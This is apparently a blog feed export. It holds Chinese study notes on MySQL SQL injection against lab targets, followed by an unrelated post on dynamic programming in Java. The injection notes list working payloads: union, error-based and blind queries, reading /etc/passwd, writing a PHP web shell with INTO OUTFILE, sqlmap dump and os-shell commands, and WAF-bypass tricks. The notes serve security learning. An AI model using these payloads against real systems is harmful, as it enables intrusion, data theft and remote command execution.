<h1 id="mysql注入："><a href="#mysql注入：" class="headerlink" title="mysql注入："></a>mysql注入：</h1><p><img src="file:///C:/Users/fourth/AppData/Roaming/Typora/typora-user-images/image-20211004154839681.png" alt="image-20211004154839681"></p>
<p><img src="file:///C:/Users/fourth/AppData/Roaming/Typora/typora-user-images/image-20211004154903142.png" alt="image-20211004154903142"></p>
<h2 id="必要知识点："><a href="#必要知识点：" class="headerlink" title="必要知识点："></a>必要知识点：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在mysql5.0以上版本中，存在一个自带的数据库：</span><br><span class="line">	information_schema 一个存储了所有数据库名，表名，列名的数据库，相当于可以通过该数据库可以获得我们想要的信息</span><br><span class="line">数据中符号.代表下一级信息 x.y:x下的y</span><br><span class="line">	information_schema.tables:记录所有表名	-- table_schema数据库名称,table_name表名</span><br><span class="line">	information_schema.columns:记录所有列名		-- column_name列名, table_name表名</span><br><span class="line">	information_schema.schemata:记录所有数据库名 -- 字段schema_name 数据库名称</span><br><span class="line">	table_name:表名</span><br><span class="line">	column_name:列名</span><br><span class="line">	schema_name:数据库名</span><br><span class="line">limit猜解多个数据</span><br><span class="line">如何判断注入点：</span><br><span class="line">	and 1=1		页面返回正常</span><br><span class="line">	and 1=2		页面返回错误</span><br><span class="line">	可能存在注入点</span><br><span class="line">	或者：</span><br><span class="line">        http://xxx.com/xxx.php?id=2</span><br><span class="line">        http://xxx.com/xxx.php?id=3-1</span><br><span class="line">        http://xxx.com/xxx.php?id=3%2D1</span><br><span class="line">        上面三个返回的结果一样则表示存在SQL注入</span><br><span class="line"></span><br><span class="line">最好的经验去测试：</span><br><span class="line">	id=1	正常</span><br><span class="line">	id=1fajfa	错误</span><br><span class="line">	可能存在注入点</span><br></pre></td></tr></table></figure>

<ul>
<li><h2 id="union联合注入"><a href="#union联合注入" class="headerlink" title="union联合注入"></a>union联合注入</h2></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">判断字段个数:</span><br><span class="line">http://219.153.49.228:40047/new_list.php?id=1 order by 5</span><br><span class="line">	order by 1</span><br><span class="line">	order by 2</span><br><span class="line">	order by 3</span><br><span class="line">	order by 4	以上正常</span><br><span class="line">	order by 5	开始错误</span><br><span class="line">	有5个字段</span><br><span class="line">报错猜测准备</span><br><span class="line">	.....?id=1 union select 1,2,3,4</span><br><span class="line">	.....?id=1shf union select 1,2,3,4</span><br><span class="line">	http://219.153.49.228:40047/new_list.php?id=-1 union select 1,2,3,4</span><br><span class="line">	-- 什么地方报错(显示出来的那个字段)就在那个字段进行相关的操作，比如在3这里报错了，就直接将3改成database()，.....?id=1shf select 1,2,database(),4</span><br><span class="line">信息收集：</span><br><span class="line">	数据库版本：version() 5.7.22-0ubuntu0.16.04.1</span><br><span class="line">	数据库名字：database()  mozhe_Discuz_StormGroup</span><br><span class="line">	数据库用户：user()  root@localhost</span><br><span class="line">	操作系统：@@version_compile_os</span><br></pre></td></tr></table></figure>

<h2 id="一般核心步骤"><a href="#一般核心步骤" class="headerlink" title="一般核心步骤"></a>一般核心步骤</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://219.153.49.228:40047/new_list.php?id=-1 union select 1,2,3,4	-- 在2,3,出显示信息</span><br><span class="line"></span><br><span class="line">查询特定数据库下的表，就是show tables</span><br><span class="line">http://219.153.49.228:40047/new_list.php?id=-1 union select 1,table_name,3,4 from information_schema.tables where table_schema=&#x27;mozhe_Discuz_StormGroup&#x27;	-- 得到表名 StormGroup_member</span><br><span class="line"></span><br><span class="line">http://219.153.49.228:40047/new_list.php?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#x27;mozhe_Discuz_StormGroup&#x27; -- StormGroup_member,notice</span><br><span class="line"></span><br><span class="line">http://219.153.49.228:40047/new_list.php</span><br><span class="line">?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#x27;StormGroup_member&#x27; -- 得到数据中特定表的字段名 id,name,password,status</span><br><span class="line"></span><br><span class="line">http://219.153.49.228:40047/new_list.php</span><br><span class="line">?id=-1 union select 1,group_concat(name),group_concat(password),4 from StormGroup_member</span><br><span class="line">-- </span><br><span class="line"></span><br><span class="line">获取所有的数据库名</span><br><span class="line">http://10.16.42.229/sqli-labs-master/Less-2/</span><br><span class="line">?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata</span><br></pre></td></tr></table></figure>

<p><img src="file:///C:/Users/fourth/AppData/Roaming/Typora/typora-user-images/image-20211004154941058.png" alt="image-20211004154941058"></p>
<p>文件读取：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">load_file() 函数</span><br><span class="line">	UNION ALL SELECT LOAD_FILE(&#x27;/etc/passwd&#x27;)-- </span><br><span class="line"></span><br><span class="line">into outerfile	into dumpfile</span><br><span class="line">	UNION SELECT “&lt;? system($_REQUEST[&#x27;cmd&#x27;]);?&gt;” INTO OUTFILE “/var/www/html/victim.com/cmd.php”-- 将一句话木马写入到目标文件里面</span><br><span class="line"></span><br><span class="line">路径常见获取方法，遗留文件，漏洞报错，平台配置文件</span><br></pre></td></tr></table></figure>

<h1 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">google ： inurl .php?id= 寻找注入点</span><br><span class="line">sqlmap -u &quot;http://192.168.248.128/dvwa/vulnerabilities/sqli/?id=1&quot; --batch --dbms=mysql</span><br><span class="line">sqlmap -u &quot;http://192.168.248.128/mutillidae/index.php?page=user-info.php&amp;username=dg&amp;password=dgd&amp;user-info-php-submit-button=View+Account+Details&quot; --batch -p username  --dbs --users --current-user --current-db</span><br><span class="line"></span><br><span class="line">--batch 自动化完成</span><br><span class="line">-p username  --dbs --users --current-user --current-db</span><br><span class="line">(判断username是否是注入点，查询都有哪些数据库,所有用户，当前用户) </span><br><span class="line">-D wordpress --tables 指定库的所有表</span><br><span class="line">-D wordpress -T wp_users --columns 指定库的的一个表的所有字段</span><br><span class="line">--dump-all dump所有数据库的所有表</span><br><span class="line">-D wordpress -T wp_users --dump dump指定的表  (会解密加密数据，自动生成一个字典)</span><br><span class="line">-D wordpress -T wp_users -C &quot;username,password&quot; --dump dump指定的表</span><br><span class="line">sqlmap -u &quot;http://10.16.42.229/sqli-labs-master/less-3/?id=1&quot; --batch</span><br><span class="line">sqlmap -u &quot;http://10.16.42.229/sqli-labs-master/less-3/?id=1&quot; dbms mysql -p id --users</span><br><span class="line">sqlmap -u &quot;http://10.16.42.229/sqli-labs-master/less-3/?id=1&quot; dbms mysql -p id --current-user</span><br><span class="line">sqlmap -u &quot;http://10.16.42.229/sqli-labs-master/less-3/?id=1&quot; dbms mysql -p id --dbs</span><br><span class="line">sqlmap -u &quot;http://10.16.42.229/sqli-labs-master/less-3/?id=1&quot; dbms mysql -p id --current-db</span><br><span class="line">sqlmap -u &quot;http://10.16.42.229/sqli-labs-master/less-3/?id=1&quot; dbms mysql -p id -D security --tables </span><br><span class="line">sqlmap -u &quot;http://10.16.42.229/sqli-labs-master/less-3/?id=1&quot; dbms mysql -p id -D security -T emails --columns </span><br><span class="line">sqlmap -u &quot;http://10.16.42.229/sqli-labs-master/less-3/?id=1&quot; dbms mysql -p id -D security -T emails --dump</span><br><span class="line">sqlmap -u &quot;http://10.16.42.229/sqli-labs-master/less-3/?id=1&quot; dbms mysql -p id -D security -T emails --dump-all</span><br></pre></td></tr></table></figure>

<p>需要登录的注入点，要加上cookie，尽可能详细</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> sqlmap -u &quot;http://192.168.248.128/dvwa/vulnerabilities/sqli/?id=1&quot; --batch --cookie=&quot;PHPSESSID:nu7gab2i5t0t8g1hbreapuhp11;security:low&quot;</span><br><span class="line">sqlmap -u &quot;http://192.168.248.128/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --batch --cookie=&quot;PHPSESSID=nu7gab2i5t0t8g1hbreapuhp11;security=low&quot; --dbms mysql -p id</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://192.168.248.128/dyvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --batch --cookie=&quot;PHPSESSID=nu7gab2i5t0t8g1hbreapuhp11;security=low&quot; --sql-shell</span><br><span class="line">sqlmap -u &quot;http://192.168.248.128/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --batch --cookie=&quot;PHPSESSID=nu7gab2i5t0t8g1hbreapuhp11;security=low&quot; --os-shell</span><br><span class="line">sqlmap -u &quot;http://192.168.248.128/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --batch --cookie=&quot;PHPSESSID=nu7gab2i5t0t8g1hbreapuhp11;security=low&quot; --os-cmd=ls /</span><br></pre></td></tr></table></figure>

<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><p>无回显的情况：可能是因为SQL语句查询方式的问题导致，这个时候需要用到相关的报错或盲注进行后续操作，</p>
<h2 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SQL注入报错用到的几个函数：</span><br><span class="line">	floor():向下取整 </span><br><span class="line">		公式：and (select 1 from (select count(*), concat(floor(rand(0)*2),0x23,(你想获取的数据的sql语句))x from information_schema.tables group by x )a) -- mysql在遇到select id x, count(*) from tables group by x;这语句的时候会建立一个虚拟表(实际上就是会建立虚拟表),其中主键为x</span><br><span class="line">		floor(rand(0)*2) 一定会报错（三条以上的记录时）</span><br><span class="line">		floor(rand()*2) 不一定会报错</span><br><span class="line">	rand():在0和1之间产生一个随机数。</span><br><span class="line">	count():计数</span><br><span class="line">在使用这个函数的时候，可以直接根据公式来进行套用即可，把“你想获取数据的SQL语句”换为之前注入的一般语句即可。如下所示：</span><br><span class="line">例子：</span><br><span class="line">	http://222.18.158.243:4606/?</span><br><span class="line">	id=1 and(select 1 from (select count(*), concat(floor(rand(0)*2),0x23,0x23,(select count(*) from information_schema.columns where table_name=0x666c6167),0x23,0x23)temp from information_schema.tables group by temp )a)</span><br><span class="line">	数据库名、数据库用户名：</span><br><span class="line">	http://222.18.158.243:4606/?</span><br><span class="line">	id=1 and(select 1 from (select count(*), concat(floor(rand(0)*2),0x23,0x23,database(),0x23,0x23,user())temp from information_schema.tables group by temp )a)</span><br><span class="line">双注入：</span><br><span class="line">	公式：and (select 1 from (select count(*), concat(floor(rand(0)*2),0x23,(你想获取的数据的sql语句))x from information_schema.tables group by x )a) -- mysql在遇到select id x, count(*) from tables group by x;这语句的时候会建立一个虚拟表(实际上就是会建立虚拟表),其中主键为x 其注入原理就是，建立虚拟表的时候，主键x冲突，产生报错</span><br><span class="line">	或者：and select count(*),concat(floor(rand(0)*2),0x23,一般的SQL注入语句) a from information_schema.tables group by a --ajd</span><br><span class="line">	&#x27; and select count(*),concat(floor(rand(0)*2),0x23,databse()) as a from information_schema.tables group by a --+</span><br><span class="line">	或者，使用 将and 改为union</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">http://10.16.42.229/sqli-labs-master/Less-5/</span><br><span class="line">?id=1&#x27; and (select 1 from (select count(*), 0x7e,concat(floor(rand(0)*2),0x23,(select group_concat(schema_name) from information_schema.schemata))x from information_schema.tables group by x )a) --+</span><br><span class="line"></span><br><span class="line">http://10.16.42.229/sqli-labs-master/Less-5/</span><br><span class="line">?id=1&#x27; and (select 1 from (select count(*), 0x7e,concat(floor(rand(0)*2),0x23,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;pikachu&#x27;))x from information_schema.tables group by x )a) --+</span><br><span class="line"></span><br><span class="line">http://10.16.42.229/sqli-labs-master/Less-5/</span><br><span class="line">?id=1&#x27; and (select 1 from (select count(*), 0x7e,concat(floor(rand(0)*2),0x23,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;pikachu&#x27; and table_name=&#x27;member&#x27;))x from information_schema.tables group by x )a) --+</span><br><span class="line"></span><br><span class="line">http://10.16.42.229/sqli-labs-master/Less-5/</span><br><span class="line">?id=1&#x27; and (select 1 from (select count(*), 0x7e,concat(floor(rand(0)*2),0x23,(select group_concat(id,username,pw,sex,phonenum,address,email) from pikachu.member))x from information_schema.tables group by x )a) --+</span><br></pre></td></tr></table></figure>

<h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extractvalue()：</span><br><span class="line">	MySQL中的XML函数，使用Xpath符号从xml字符串中提取值。extractvalue(目标xml文档，xml路径)</span><br><span class="line">	extractvalue()能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用substring()函数截取，一次查看32位</span><br><span class="line">列子：</span><br><span class="line">	表名：</span><br><span class="line">	http://222.18.158.243:4607/?</span><br><span class="line">	id=1 and extractvalue(1,concat(0x7e,0x7e,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,1)))</span><br></pre></td></tr></table></figure>

<h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">updatexml()：</span><br><span class="line">	MySQL中的XML函数，返回被替换的XML段。</span><br><span class="line">	updatexml(目标xml文档，xml路径，更新的内容)</span><br><span class="line">	公式:and updatexml(0x23,sql语句,1)</span><br><span class="line">		同样，这里也是使用的是and 所以需要保证前面的用户名存在</span><br><span class="line">例子：</span><br><span class="line">	http://222.18.158.243:4608/?</span><br><span class="line">	id=1 and updatexml(0x3a,concat(user(),0x3a,0x3a,database()),1)</span><br><span class="line">	http://222.18.158.243:4608/?</span><br><span class="line">	id=1 and updatexml(0x3a,concat(1,0x3a,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,1)),1)</span><br><span class="line">	</span><br><span class="line">一般修改密码的时候是需要根据用户名来查询该用户是否存在，如果存在才需要修改密码，并且，修改密码的数据是如下所示的，所以，其注入点应该是在password里</span><br><span class="line">	&quot;UPDATE users SET password = &#x27;$passwd&#x27; WHERE username=&#x27;$row1&#x27;&quot;</span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<h2 id="基于时间的盲注："><a href="#基于时间的盲注：" class="headerlink" title="基于时间的盲注："></a>基于时间的盲注：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">没有任何的报错信息，只能靠时间线的长短来判断。</span><br><span class="line">length（）返回字符串的长度</span><br><span class="line">ascii()返回字符的ASCII码值</span><br><span class="line">substr(string,from,total),对string字符串进行截取，从第from个字符开始，总共截取 total个字符。</span><br><span class="line"></span><br><span class="line">例子：</span><br><span class="line">	IF(Condition,A,B)：当Condition为TRUE时，返回A；当Condition为FALSE时，返回B。</span><br><span class="line">   获得字段个数：3</span><br><span class="line">	http://222.18.158.243:4609/?</span><br><span class="line">	id=1 and if((select count(column_name) from information_schema.columns where table_name= &#x27;users&#x27;)=3,sleep(1),1)</span><br><span class="line">	现在通过二分法来猜测数据库的数据库名字：</span><br><span class="line">	http://222.18.158.243:4609/?</span><br><span class="line">	id=1 and if(ascii(substr(database(),1,1))&gt;0x61,sleep(1),1)</span><br><span class="line">	</span><br><span class="line">	#注意and前面的参数需要成真，才可以顺利进行盲注</span><br></pre></td></tr></table></figure>

<p>benchmark()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BENCHMARK(count,expr) 函数重复count次执行表达式expr，它可以用于计时MySQL处理表达式有多快，结果值总是0。</span><br><span class="line">其中所用到的函数：</span><br><span class="line">	length（）返回字符串的长度，</span><br><span class="line">	ascii()返回字符的ASCII码值，</span><br><span class="line">	substr(string,from,total),对string字符串进行截取，从第from个字符开始，总共截取 total个字符。</span><br><span class="line">benchmark函数和sleep类似。由测试可知，benchmark(1000000,md5(&#x27;123&#x27;))执行的时间大约是240-250ms之间。</span><br><span class="line"></span><br><span class="line">猜测数据库用户名的长度：</span><br><span class="line">	http://222.18.158.243:4610/?</span><br><span class="line">	id= 1 and if(length(user())=18,benchmark(1000000,md5(&#x27;123&#x27;)),1)</span><br><span class="line">基于bool-逻辑判断</span><br><span class="line">regexp,like,ascii,left,ord,mid</span><br><span class="line"></span><br><span class="line">基于时间的SQL盲注-延时判断:</span><br><span class="line">if sleep</span><br><span class="line"></span><br><span class="line">基于报错的SQL盲注-报错回显:</span><br><span class="line">floor,updatexml,extractvalue</span><br><span class="line">https://www.jianshu.com/p/bc35f8dd4f7c</span><br><span class="line"></span><br><span class="line">like &#x27;ro%&#x27;	判断ro或ro...是否成立</span><br><span class="line">regexp &#x27;^temp[a-z]&#x27;	匹配temp或temp...等</span><br><span class="line">if(condition,5,0)	如果条件成立返回5，否则返回0</span><br><span class="line">sleep(5)	延迟执行5秒</span><br><span class="line">mid(a,b,c)	从b位置开始，截取a字符串的c位</span><br><span class="line">substr(a,b,c)	从位置b开始，截取字符串a的c长度</span><br><span class="line">left(database(),1),database() left(a,b)从左侧截取A的前b位</span><br><span class="line">length(database()=8)	判断数据库名的长度是否是8</span><br><span class="line">ord=ascii ascii(x)=97 判断x的ASCII码是否是97</span><br></pre></td></tr></table></figure>

<h1 id="特殊情况"><a href="#特殊情况" class="headerlink" title="特殊情况"></a>特殊情况</h1><p>过滤了特殊符号的字符型注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function blacklist($id)&#123;</span><br><span class="line">	$id= preg_replace(&#x27;/or/i&#x27;,&quot;&quot;, $id);			//strip out OR (non case sensitive)</span><br><span class="line">	$id= preg_replace(&#x27;/and/i&#x27;,&quot;&quot;, $id);		//Strip out AND (non case sensitive)</span><br><span class="line">	$id= preg_replace(&#x27;/[\/\*]/&#x27;,&quot;&quot;, $id);		//strip out /*</span><br><span class="line">	$id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id);		//Strip out --</span><br><span class="line">	$id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id);			//Strip out #</span><br><span class="line">	$id= preg_replace(&#x27;/[\s]/&#x27;,&quot;&quot;, $id);		//Strip out spaces</span><br><span class="line">	$id= preg_replace(&#x27;/[\/\\\\]/&#x27;,&quot;&quot;, $id);		//Strip out slashes</span><br><span class="line">	return $id;</span><br><span class="line">&#125;</span><br><span class="line">过滤了OR,AND,*,--,#,空格,\</span><br><span class="line">找注入点</span><br><span class="line">http://222.18.158.243:4603/?id=1     #注意显示内容，WHERE id=&#x27;1&#x27;，</span><br><span class="line">http://222.18.158.243:4603/?id=1&#x27;  #无任何显示 ，注意，与第1题相比多了一个’</span><br><span class="line"></span><br><span class="line">因为有过滤，所以order by \and 等命令都不能使用。</span><br><span class="line">用o/**/rder来绕过or过滤</span><br><span class="line">用a/**/nd 来绕过and过滤，或者使ID=0来强制报错</span><br><span class="line">把注释改为；%00截断</span><br><span class="line">%a0表示空格</span><br></pre></td></tr></table></figure>

<p>过滤了逗号的字符型注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">    if(stripos($id,&#x27;,&#x27;))&#123;		//stripos函数作用：查找 &quot;php&quot; 在字符串中第一次出现的位置</span><br><span class="line">      $id=&#x27;1&#x27;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">      $id=$id;</span><br><span class="line">    &#125;</span><br><span class="line">	return $id;</span><br><span class="line">&#125;</span><br><span class="line">过滤了逗号，在注入语句中使用join函数可以绕过</span><br><span class="line">join函数：联合查询，inner join，left join，right join</span><br><span class="line">http://222.18.158.243:4604/</span><br><span class="line">?id=1&#x27; and 1=2 union select * from ((select 1)a join (select 2)b JOIN (select SCHEMA_NAME from information_schema.SCHEMATA limit 1 offset 1)c)%23</span><br><span class="line">加解密注入：</span><br><span class="line">	有些时候，其参数是使用了加密之后才进行注入的</span><br><span class="line">	http://10.16.42.229/sqli-labs-master/Less-21/  cookie</span><br><span class="line">二次注入：</span><br><span class="line">	http://10.16.42.229/sqli-labs-master/Less-24/</span><br><span class="line">	先将SQL语句存入到数据库中，然后后面触发执行</span><br><span class="line">	&#x27;#</span><br><span class="line">dnslog注入漏洞(高权限)：</span><br><span class="line">	http://10.16.42.229/sqli-labs-master/Less-9/</span><br></pre></td></tr></table></figure>

<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>就是多条语句同时执行的结果，在;分号后面继续输入SQL语句，进行注入。</p>
<p><a href="http://10.16.42.229/sqli-labs-master/Less-38/">http://10.16.42.229/sqli-labs-master/Less-38/</a></p>
<p>一般使用堆叠注入进行数据插入</p>
<h1 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h1><p>绕过的基本思想如下图所示：</p>
<p><img src="file:///C:/Users/fourth/AppData/Roaming/Typora/typora-user-images/image-20211004155022791.png" alt="image-20211004155022791"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">明确网站的类型：Apache+mysql？</span><br><span class="line">绕过安全狗的URL：</span><br><span class="line">    正常：?id=-1 union select 1,2,3#</span><br><span class="line">    ?id=-1 union%23a%0Aselect 1,2,3#</span><br><span class="line">    %0A 换行</span><br><span class="line">    %23 # 注释  注释后面加上一个字符，表示的是注释</span><br><span class="line">参数污染：传递相同的参数名的不同值</span><br><span class="line">	http://10.16.42.229/sqli-labs-master/Less-2/?id=1/**&amp;id=-1%20union%20select%201,2,3%23*/</span><br><span class="line">	/***/ mysql中的注释</span><br><span class="line">	参数污染+注释，可绕过安全狗</span><br><span class="line">修改http header来bypass waf：</span><br><span class="line">	x-forward-for</span><br><span class="line">	x-remote-IP</span><br><span class="line">	x-originating-IP</span><br><span class="line">	x-remote-addr</span><br><span class="line">	x-Real-ip</span><br><span class="line">静态资源：</span><br><span class="line">	特定的静态资源后缀请求，常见的静态文件（.js .jpg.qwf .css等），类似白名单限制机制，waf为了检测效率，不去检测这样一些文件名后缀的请求。</span><br><span class="line">	http://10.16.42.229/sqli-labs-master/Less-2/?id=-1 union select 1,2,3# 被拦截</span><br><span class="line">	http://10.16.42.229/sqli-labs-master/Less-2/temp.txt?id=-1 union select 1,2,3# 成功绕过</span><br><span class="line">	Apache只识别到前面的.php/.aspx，后面的不识别</span><br><span class="line">爬虫白名单：</span><br><span class="line">URL白名单：</span><br><span class="line"></span><br><span class="line">http://10.16.42.229/sqli-labs-master/Less-2/?id=-1%20union%20/*!44509select*/%201,2,3-- </span><br><span class="line">http://10.16.42.229/sqli-labs-master/Less-2/?id=-1%20union%20all%23%0a%20select%201,2,3#</span><br><span class="line"></span><br><span class="line">sqlmap可设置绕过脚本，代理等：--temper  --proxy</span><br><span class="line">sqlmap功能尤其强大，需要好好利用，当之无愧的注入神器</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Penetration</category>
      </categories>
      <tags>
        <tag>Penetration</tag>
      </tags>
  </entry>
  <entry>
    <title>刷题-算法篇</title>
    <url>/2022/03/18/%E5%88%B7%E9%A2%98-%E7%AE%97%E6%B3%95%E7%AF%87/</url>
    <content><![CDATA[<h1 id="动态规划-dynamic-programming-DP"><a href="#动态规划-dynamic-programming-DP" class="headerlink" title="动态规划 dynamic programming DP"></a>动态规划 dynamic programming DP</h1><p><a href="https://blog.csdn.net/u013309870/article/details/75193592">https://blog.csdn.net/u013309870/article/details/75193592</a></p>
<p>适用于有重叠子问题和最优子结构性质的问题。</p>
<blockquote>
<p>最优子结构：如果问题的最优解所包含的子问题的解也是最优的。</p>
<p>无后效性：子问题的解一旦确定就不再更改。</p>
<p>子问题重叠性质：旨在使用递归算法自顶向下对问题进行求解的时候，每次产生的子问题并不总是新问题，有些子问题需要被重复计算多次。</p>
</blockquote>
<p>其思想：先计算子问题，然后根据子问题得出原问题的解，所以需要存储子问题</p>
<p>思考动态规划的解题思路的时候一般用的是：**<u>从结果推出上一个子问题的答案，以此来推断出状态转移方程</u>**</p>
<p>动态规划算法有两种形式：</p>
<ul>
<li>自顶向下的备忘录法</li>
<li>自底向上</li>
</ul>
<p>动态规划经典案例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//动态规划节约空间，自第向上   </span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">jumpFloor</span><span class="params">(<span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="comment">//分步骤完成 ，用乘法</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">temp_1</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">temp_2</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=target;i++)&#123;</span><br><span class="line">            result = temp_1+temp_2;</span><br><span class="line">            temp_2 = temp_1;</span><br><span class="line">            temp_1 = result;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result ;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//自底向上</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">jumpFloor</span><span class="params">(<span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="comment">//分步骤完成 ，用乘法</span></span><br><span class="line">        <span class="type">int</span> dp[] = <span class="keyword">new</span> <span class="title class_">int</span>[target+<span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=target;i++)&#123;</span><br><span class="line">            dp[i] = dp[i-<span class="number">1</span>]+dp[i-<span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[target] ;      </span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//递归，存储中间值</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;    </span><br><span class="line">    <span class="type">int</span> dp[] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">50</span>];    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">jumpFloor</span><span class="params">(<span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="comment">//分步骤完成 ，用乘法        </span></span><br><span class="line">        <span class="keyword">if</span>(target&lt;=<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(dp[target]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> dp[target];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[target] = jumpFloor(target-<span class="number">1</span>)+jumpFloor(target-<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//递归</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">jumpFloor</span><span class="params">(<span class="type">int</span> target)</span> &#123;      </span><br><span class="line">        <span class="keyword">if</span>(target&lt;=<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> jumpFloor(target-<span class="number">1</span>)+jumpFloor(target-<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p>利用<code>Brian Kernighan</code>算法，可以在一定程度上进一步提升计算速度。Brian Kernighan 算法的原理是：对于任意整数 x，令 x&#x3D;x&amp;(x-1)x，该运算将 xx 的二进制表示的最后一个 1 变成 0。因此，对 x 重复该操作，直到 x 变成 0，则操作次数即为 x 的「一比特数」<br><font color = red>正整数 y 是 2 的整数次幂，当且仅当 y&amp;(y-1)&#x3D;0</font></p>
<p>得到0-n的所有数据的bit的1的个数:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] countBits(<span class="type">int</span> n) &#123;</span><br><span class="line">        <span class="type">int</span>[] bits = <span class="keyword">new</span> <span class="title class_">int</span>[n + <span class="number">1</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">highBit</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((i &amp; (i - <span class="number">1</span>)) == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">//i是2的整数次幂，只有最高位为1，其余为0，在这里highbit表示的是bit[i]的最高有效位</span></span><br><span class="line">                highBit = i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//bit[i]&gt;bit[j],i&gt;j&gt;0,并且i比j的二进制1多一个，</span></span><br><span class="line">            bits[i] = bits[i - highBit] + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bits;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

